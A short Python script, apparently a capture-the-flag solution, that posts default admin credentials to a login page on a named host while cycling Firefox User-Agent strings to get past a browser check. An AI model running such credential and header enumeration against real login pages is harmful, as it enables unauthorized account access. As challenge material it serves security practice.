import requests

# %d means version
ua = "Mozilla/5.0 (Windows NT 5.1; rv:%d.0) Gecko/20100101 Firefox/%d.0"

url = "http://ssat-ps.iptime.org:5102/login.php"
err_msg = "Incompatible browser detected."

email = "admin@oooverflow.io"
pwd = "admin"
data = {"email": email, "pwd": pwd}

for i in range(21, 43):
	headers={'User-Agent': ua%(i, i)}

	r = requests.post(url, data=data, headers=headers)
	if not err_msg in r.text:
		print r.text

